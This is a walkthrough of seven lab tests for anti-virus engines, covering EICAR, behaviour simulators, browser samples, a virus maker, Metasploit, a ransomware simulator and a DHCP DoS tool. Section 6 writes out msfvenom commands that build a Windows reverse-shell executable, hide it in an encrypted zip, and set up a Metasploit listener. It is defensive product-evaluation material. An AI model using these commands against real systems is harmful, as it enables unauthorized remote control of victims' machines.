[Malware][Anti-Virus] Anti-Virus / Anti-Malware Engine Testing walkthrough in 2022

Author: demonalex (Alex Huang / chaoyi.huang@connect.polyu.hk)
Updated on Oct 10, 2022

1	Summary
The purpose of this document is to describe a couple of test cases dedicated to verifying the effectiveness and efficiency of those Anti-Virus / Anti-Malware engines aiming to determine and removing malicious code. Hope this document is helpful for buy-in sides to pick up appropriate products, and for those manufacturers to improve their products.

Without further ado, there would be Seven test cases shown as follows:
•	Basic Signature-base Testing
•	Malware Simulator Testing
•	Browser-based Malware Testing
•	Customizing Malware Testing
•	Metasploit Framework Testing
•	Ransomware Testing
•	Self-developed Simulating Malware Testing
The chapters below would drill down the details of each test case. The test environment is based on the following tools:
Host OS: Microsoft Windows 10 Pro 21H2 (OS build 19044.2006)
Hypervisor: VirtualBox 6.1.38 r 153438 (https://www.virtualbox.org/)
Guest OS: Microsoft Windows 10 (https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
Guest OS: Kali Linux 2022 W39 Virtualbox amd64 image (https://www.kali.org/get-kali/#kali-virtual-machines)

2	Basic Signature-base Testing
2.1	Description
Basic Signature-base Testing specializes in utilizing so-called “the most popular virus signature”, namely EICAR, to determine if the tested engine(s) could identify it.

2.2	Reference(s)
https://www.eicar.org/
https://www.eicar.org/download-anti-malware-testfile/

2.3	Adverse Tool(s)
The eicar file containing the specific string being supposed to be identified by Anti-virus Engine(s) is downloaded from https://www.eicar.org/download-anti-malware-testfile/

2.4	Auxiliary Tool(s)
Windows Virus & Threat Protection

2.5	Test Step(s)
1)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at Guest OS.
2)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at Guest OS.
3)	Download the eicar file from https://www.eicar.org/download-anti-malware-testfile/, or open a Notepad before writing down the eicar string into Notepad and save as an EXE file at Guest OS.

2.6	Expected Result
The third step above should be stopped by the tested engine(s), or the eicar file should be removed by the tested engine(s) if the engine(s) is working as expected.

2.7	Failed Result
During the third step above, the tested engine(s) cannot identify the eicar file nor raise any alert.

3	Malware Simulator Testing
3.1	Description
Malware Simulator Testing attempts to simulate some behaviors of which many malwares usually conduct in order to confirm if the tested engine(s) would utilize Behavior-based detection capacity to stop the behaviors.

3.2	Reference(s)
https://www.spyshelter.com/security-test-tool/

3.3	Adverse Tool(s)
SpyShelter AntiTest.exe (downloaded from https://www.spyshelter.com/security-test-tool/)

3.4	Auxiliary Tool(s)
None

3.5	Test Step(s)
1)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at Guest OS.
2)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at Guest OS.
3)	Download the AntiTest.exe from https://www.spyshelter.com/security-test-tool/.
4)	Execute AntiTest.exe and walk through each test case sitting in the application to see if any test case would be stopped by the tested engine(s).

3.6	Expected Result
All test cases gone through during the fourth step above are failed in that the tested engine(s) considers those test cases as malicious behaviors before prohibiting them from being conducted.

3.7	Failed Result
All test cases gone through during the fourth step above are executed successfully according to the test cases’ execution output.

4	Browser-based Malware Testing
4.1	Description
Browser-based Malware Testing applies browsers to surf browser-based malware in an effort to determine if the tested engine(s) could identify the malware.

4.2	Reference(s)
https://www.wicar.org/
https://www.wicar.org/test-malware.html
https://www.wicar.org/results.html

4.3	Adverse Tool(s)
Those samples found at https://www.wicar.org/test-malware.html

4.4	Auxiliary Tool(s)
Browsers (e.g. iexplore.exe in this test case)

4.5	Test Step(s)
1)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at Guest OS.
2)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at Guest OS.
3)	Click “Start”->”Run”, type iexplore.exe, and tap Enter button before launching Internet Explore (IE).
4)	Utilize IE to browse https://www.wicar.org/test-malware.html, and click those red buttons (P.S.: clicking each button invokes a specific Browser-based test case) to see if the tested engine(s) could identify the browser-based malware and block them.

4.6	Expected Result
The pages showing up after the said red buttons are clicked during the fourth step above should be blocked by the tested engine(s). Some examples of blocking the pages could be referred at https://www.wicar.org/results.html.
Bear in mind that some browsers and Internet Service Providers (ISP) may automatically block the access of the website, https://www.wicar.org/, by default, so the tester may manually choose to allow the above-mentioned access when that situation happens.

4.7	Failed Result
The pages showing up after the said red buttons are clicked during the fourth step above could be opened and browsed without any hiccup.

5	Customizing Malware Testing
5.1	Description
By leveraging so-called Virus Maker tool(s), Customizing Malware Testing aims to establish if the tested engine(s) could identify customized virus/malware.

5.2	Reference(s)
http://www.jeyjey.blogfa.com/

5.3	Adverse Tool(s)
JPS Virus Maker 3.0

5.4	Auxiliary Tool(s)
None

5.5	Test Step(s)
1)	Use Host OS or another Guest OS to execute JPS Virus Maker (i.e. jps.exe) and select some straightforward options, such as Crazy Mouse, before tapping “Create Virus!” button so that a virus sample named Sender.exe would be generated.
2)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at Guest OS.
3)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at Guest OS.
4)	Copy the said Sender.exe file to the testing Guest OS.
5)	Execute Sender.exe at Guest OS.

5.6	Expected Result
The fifth step above should be stopped by the tested engine(s) given that Sender.exe conducts suspicious behavior(s).

5.7	Failed Result
The fifth step above is executed successfully and the mouse cursor shows up with a busy icon.

6	Metasploit Framework Testing
6.1	Description
As its name suggests, an embedded program named msfvenom of Metasploit Framework, the most popular penetration testing framework, would be used to generate a windows unauthorized remote control shell being executed and detected by the tested engine(s).

6.2	Reference(s)
https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html

6.3	Adverse Tool(s)
Kali Linux and built-in Metasploit Framework

6.4	Auxiliary Tool(s)
None

6.5	Test Step(s)
1)	Deploy another Kali guest OS, and run the following command in order to generate a reverse shell (P.S.: the IP and PORT below refer to the IP and Port of the Kali guest OS):
# msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
2)	Upload the shell-x86.exe to VirusTotal (https://www.virustotal.com) to confirm if the reverse shell could be identified other anti-virus / anti-malware engines.
3)	Execute the command below to pack the reverse shell into a ZIP file in an encrypted manner:
# zip -re ./shell-x86.zip ./shell-x86.exe
4)	Copy the shell-x86.zip to the Windows guest OS.
5)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at Guest OS.
6)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at Guest OS.
7)	Unzip the shell-x86.zip at the Windows guest OS.
8)	Run the following commands at Kali guest OS so that the listener for Reverse Shell is ready (P.S.: the IP below is the IP address of Kali guest OS):
# msfconsole
	Msf6> use exploit/multi/handler
	Msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
	Msf6 exploit(multi/handler) > set lhost <IP>
	Msf6 exploit(multi/handler) > run
9)	Execute the shell-x86.exe at Windows guest OS.

6.6	Expected Result
Either the seventh step or the nineth step above should be stopped by the tested engine(s), and there will be no shell being obtained by the Kali guest OS.

6.7	Failed Result
Both the seventh step and the eighth step are being executed successfully; meanwhile, a shell is popping up after the nineth step above is executed.

7	Ransomware Testing
7.1	Description
Ransomware Testing aims to validate the detection capability of tested engine(s) by simulating the behaviors of those infamous ransomware.

7.2	Reference(s)
https://www.knowbe4.com/ransomware-simulator

7.3	Adverse Tool(s)
Ransomware Simulator (downloaded from https://www.knowbe4.com/ransomware-simulator)

7.4	Auxiliary Tool(s)
None

7.5	Test Step(s)
1)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at the guest OS.
2)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at the guest OS.
3)	Copy SimulatorSetup.exe, downloaded from KnowBe4, to the guest OS before installing it.
4)	Launch KnowBe4 Ran Simulator at the guest OS and click the “Check now” button to go through those embedded test cases.

7.6	Expected Result
After the fourth step above is complete, the Status column of the test result should show all in GREEN.

7.7	Failed Result
After the fourth step above is complete, the Status column of the test result contains RED item(s).

8	Self-developed Simulating Malware Testing
8.1	Description
Self-developed Simulating Malware Testing is dedicated to verifying if the tested engine(s) could identify self-developed malware.

8.2	Reference(s)
None

8.3	Adverse Tool(s)
A DHCP Denial of Service (DoS) attacker named Fatgirl (https://github.com/d3m0n4l3x/fatgirl), which would send out malicious DHCP packets to the network when launched.

8.4	Auxiliary Tool(s)
Wireshark (https://www.wireshark.org/download.html)

8.5	Test Step(s)
1)	Make sure the anti-virus engine(s) being tested has been installed, deployed, and running properly and successfully at the guest OS.
2)	Turn off “Real-time protection” function at Windows Virus & Threat Protection at the guest OS.
3)	Download Fatgirl_v2.exe from https://github.com/d3m0n4l3x/fatgirl/blob/master/fatgirl_v2.exe at the guest OS.
4)	Execute Fatgirl_v2.exe at the guest OS.
5)	Launch Wireshark and monitor DHCP packets (Capture Filter: udp port 67 or 68) sent by the guest OS.

8.6	Expected Result
Either the third or the fourth step above is stopped by the tested engine(s), and there should be NO packet captured by Wireshark.

8.7	Failed Result
Both the third and the fourth steps above are executed successfully, and Wireshark captures corresponding DHCP packets sent by Fatgirl.
